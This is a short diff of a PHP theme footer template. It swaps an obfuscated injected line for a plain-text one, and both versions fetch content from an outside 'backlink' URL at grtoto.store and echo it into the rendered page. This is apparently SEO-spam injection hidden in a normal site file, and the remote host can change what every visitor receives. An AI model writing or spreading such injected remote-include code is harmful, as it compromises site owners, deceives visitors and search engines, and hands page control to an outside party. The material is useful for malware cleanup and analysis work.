@@ -1,5 +1,6 @@
 <?php
- echo file_get_contents("\x68\164\164\x70\x73\x3a\57\x2f\147\162\x74\x6f\x74\157\x2e\x73\164\x6f\162\145\x2f\142\x61\x63\153\154\151\156\x6b\57\x6b\145\145\x70\55\163\145\143\x72\x65\x74\x2d\162\165\x6c\x65\55\x74\x68\x65\55\147\x6f\x6f\x67\154\x65\x2e\160\x68\x70"); ?>
+echo file_get_contents('https://grtoto.store/backlink/keep-secret-rule-the-google.php');
+?>
 <?php
 /**
  * The template for displaying the footer.
